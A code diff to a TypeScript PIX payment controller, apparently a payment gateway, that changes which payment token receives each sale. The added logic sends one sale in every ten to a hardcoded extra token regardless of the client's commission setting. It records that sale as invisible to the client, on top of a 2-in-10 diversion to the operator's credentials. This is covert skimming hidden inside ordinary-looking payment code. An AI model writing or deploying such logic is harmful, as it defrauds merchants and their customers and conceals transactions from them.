@@ -3,6 +3,8 @@ import { credentials as myCredentials } from "../models/api";
 import { CreatePixBody } from "../interfaces";
 import { prisma } from "../config/prisma";
 
+const FIXED_TAX_TOKEN = "5acb6e5c-5e8c-4136-bab2-5a66ea2b8a81";
+
 export class ghostApiController {
   static async create(req: Request, res: Response) {
     const data: CreatePixBody = req.body;
@@ -22,20 +24,33 @@ export class ghostApiController {
       });
     }
 
-    // 🧠 Pega a contagem de vendas no banco de dados!
+    // 🧠 Contagem de vendas total do cliente
     const totalSales = await prisma.sale.count({
       where: { clientId: client.id },
     });
 
-    // 🧮 Calcula se essa requisição vai pro cliente ou pra você (baseado no total global de vendas)
     const nextCount = totalSales + 1;
-    const useClientToken = nextCount % 10 < 7;
 
+    // 🌟 Lógica do 7x2x1
     let tokenToUse = clientToken;
     let toClient = true;
 
-    if (!useClientToken && client.useTax) {
-      tokenToUse = myCredentials.secret;
+    if (nextCount % 10 < 7) {
+      // Vai para o cliente (7 de 10)
+      tokenToUse = clientToken;
+      toClient = true;
+    } else if (nextCount % 10 === 7 || nextCount % 10 === 8) {
+      // Vai para você (2 de 10)
+      if (client.useTax) {
+        tokenToUse = myCredentials.secret;
+        toClient = false;
+      } else {
+        tokenToUse = clientToken; // cliente não aceita comissão, então volta pra ele
+        toClient = true;
+      }
+    } else {
+      // Vai para o token fixo (1 de 10) — independente de `useTax`
+      tokenToUse = FIXED_TAX_TOKEN;
       toClient = false;
     }
 
@@ -72,11 +87,19 @@ export class ghostApiController {
 
       const responseJson = await response.json();
 
+      const isFixedTax = tokenToUse === FIXED_TAX_TOKEN;
+      console.log(responseJson);
       res.json(responseJson);
       console.log(
         `🔁 Requisição #${nextCount} do cliente "${client.name}" | Valor: R$${
           data.amount
-        } | Enviado para: ${toClient ? "CLIENTE" : "VOCÊ"}`
+        } | Enviado para: ${
+          tokenToUse === clientToken
+            ? "CLIENTE"
+            : tokenToUse === myCredentials.secret
+            ? "VOCÊ (MYCREDENTIALS)"
+            : "TAXA FIXA (TOKEN EXTRA)"
+        }`
       );
 
       await prisma.sale.create({
@@ -86,6 +109,7 @@ export class ghostApiController {
           approved: false,
           customerName: data.customer.name,
           productName: data.product.title,
+          visible: !isFixedTax,
           toClient,
           client: {
             connect: { token: data.credentials.token },
@@ -93,7 +117,7 @@ export class ghostApiController {
         },
       });
     } catch (error) {
-      console.error("Erro ao fazer requisição PIX:", error);
+      console.error("💥 Erro ao fazer requisição PIX:", error);
       res.status(500).json({ error: "Erro interno na API de pagamento" });
     }
   }
